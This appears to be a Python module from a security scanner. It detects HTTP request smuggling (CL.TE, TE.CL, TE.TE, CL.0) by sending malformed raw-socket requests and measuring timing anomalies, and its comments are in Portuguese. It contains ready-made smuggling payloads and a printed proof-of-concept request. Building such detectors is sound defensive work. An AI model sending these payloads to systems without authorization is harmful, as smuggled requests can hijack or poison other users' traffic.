"""
ingotus/core/smuggling.py

HTTP Request Smuggling detector via raw TCP sockets.
Detecta vulnerabilidades CL.TE, TE.CL, TE.TE e CL.0 sem usar urllib/requests,
que corrigem automaticamente os headers e impedem o envio de payloads malformados.

Referências:
  - https://portswigger.net/web-security/request-smuggling
  - https://portswigger.net/research/http2
"""

import socket
import ssl
import time
import re
from typing import Optional, Dict, Any, List


# ── Constants ──────────────────────────────────────────────────────────────────
SMUGGLE_TIMEOUT   = 8.0   # seconds to wait for timing-based detection
CONNECT_TIMEOUT   = 4.0
NORMAL_TIMEOUT    = 3.0   # baseline for timing comparison


def _raw_send(host: str, port: int, payload: bytes, use_tls: bool, timeout: float) -> Optional[bytes]:
    """Open a raw TCP socket, optionally wrap in TLS, send payload, read response."""
    try:
        sock = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        sock.sendall(payload)
        data = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 50:
                    # Give a tiny extra window to detect slow-drip timing
                    time.sleep(0.2)
                    break
            except (socket.timeout, ConnectionResetError):
                break
        sock.close()
        return data
    except Exception:
        return None


def _measure_baseline(host: str, port: int, use_tls: bool) -> float:
    """Measure normal response time to establish timing baseline."""
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    t0 = time.time()
    _raw_send(host, port, payload, use_tls, NORMAL_TIMEOUT)
    return time.time() - t0


def _parse_status(response: Optional[bytes]) -> int:
    """Extract HTTP status code from raw response bytes."""
    if not response:
        return 0
    try:
        line = response.split(b"\r\n")[0].decode("utf-8", errors="ignore")
        return int(line.split(" ")[1])
    except Exception:
        return 0


def _build_cl_te_payload(host: str) -> bytes:
    """
    CL.TE payload: Content-Length says 6 bytes but Transfer-Encoding chunked says 0 (end).
    The remaining 'G' poisons the next request's method on the backend.
    """
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"G"
    ).encode()


def _build_te_cl_payload(host: str) -> bytes:
    """
    TE.CL payload: Transfer-Encoding says chunked body ending after 1 byte ('G').
    Content-Length: 4 tricks the front-end into forwarding extra.
    """
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"5c\r\n"
        f"GPOST / HTTP/1.1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 15\r\n"
        f"\r\n"
        f"x=1\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode()


def _build_te_te_payload(host: str) -> bytes:
    """
    TE.TE payload: uses obfuscated Transfer-Encoding to confuse one proxy.
    Front-end honors normal TE, back-end honors obfuscated one (or vice versa).
    """
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: identity\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"5c\r\n"
        f"GPOST / HTTP/1.1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 15\r\n"
        f"\r\n"
        f"x=1\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode()


def _build_cl0_payload(host: str) -> bytes:
    """
    CL.0 payload: Content-Length: 0 with a body.
    Some keep-alive servers treat CL:0 as end of headers, leaking body to next req.
    """
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"SMUGGLED"
    ).encode()


def detect_smuggling(host: str, port: int = 443) -> List[Dict[str, Any]]:
    """
    Run all 4 smuggling detection tests against a host:port.
    Returns list of confirmed/suspected findings.

    Strategy:
      1. Measure baseline response time (normal GET /)
      2. Send each smuggling payload
      3. If response is unexpectedly slow (>2x baseline + 3s) → timing-based detection
      4. If response contains 400/500 on second probe → content-based detection
    """
    use_tls  = (port == 443)
    findings = []

    # Establish baseline
    baseline = _measure_baseline(host, port, use_tls)

    tests = [
        ("CL.TE",   _build_cl_te_payload(host),  "Content-Length front / Transfer-Encoding chunked back"),
        ("TE.CL",   _build_te_cl_payload(host),  "Transfer-Encoding front / Content-Length back"),
        ("TE.TE",   _build_te_te_payload(host),  "Obfuscated Transfer-Encoding header"),
        ("CL.0",    _build_cl0_payload(host),     "Content-Length: 0 with trailing body"),
    ]

    for tech, payload, explanation in tests:
        t0       = time.time()
        response = _raw_send(host, port, payload, use_tls, SMUGGLE_TIMEOUT)
        elapsed  = time.time() - t0
        status   = _parse_status(response)

        timing_threshold = max(baseline * 2.5, baseline + 4.0)
        timing_anomaly = elapsed > timing_threshold

        # HTTP errors alone do not prove request smuggling. Proxies routinely
        # return 400/5xx for malformed requests or an unavailable upstream.
        # A timing anomaly must repeat before it becomes a finding.
        if timing_anomaly:
            confirm_t0 = time.time()
            confirm_response = _raw_send(host, port, payload, use_tls, SMUGGLE_TIMEOUT)
            confirm_elapsed = time.time() - confirm_t0
            if confirm_elapsed <= timing_threshold:
                continue

            confirm_status = _parse_status(confirm_response)
            response_anomaly = status in (400, 408) and confirm_status == status
            confidence = "LIKELY" if response_anomaly else "SUSPECTED"

            proto = "https" if use_tls else "http"

            findings.append({
                "technique":   tech,
                "confidence":  confidence,
                "elapsed":     round(elapsed, 2),
                "baseline":    round(baseline, 2),
                "status":      status,
                "explanation": explanation,
                "evidence": (
                    f"Técnica: {tech} — {explanation}\n"
                    f"Host: {host}:{port}\n"
                    f"Tempo de resposta: {elapsed:.2f}s (baseline: {baseline:.2f}s)\n"
                    f"Tempo de confirmação: {confirm_elapsed:.2f}s\n"
                    f"Status retornado: {status}\n"
                    f"Confiança: {confidence}\n"
                    f"Anomalia de timing: {'SIM' if timing_anomaly else 'NÃO'}\n"
                    f"Anomalia de status: {'SIM' if response_anomaly else 'NÃO'}\n\n"
                    f"PoC cURL:\n"
                    f"  # Enviar payload de smuggling manualmente:\n"
                    f"  python3 -c \"\nimport socket,ssl\n"
                    f"  s=socket.create_connection(('{host}',{port}))\n"
                    f"  # Adicionar TLS se necessário e enviar o payload abaixo\"\n\n"
                    f"  Payload RAW ({tech}):\n"
                    f"  POST / HTTP/1.1\\r\\n"
                    f"  Host: {host}\\r\\n"
                    f"  Content-Length: 6\\r\\n"
                    f"  Transfer-Encoding: chunked\\r\\n\\r\\n"
                    f"  0\\r\\n\\r\\nG\n\n"
                    f"  Referência: https://portswigger.net/web-security/request-smuggling/finding"
                ),
                "severity": "HIGH" if confidence == "LIKELY" else "MEDIUM",
            })

    return findings
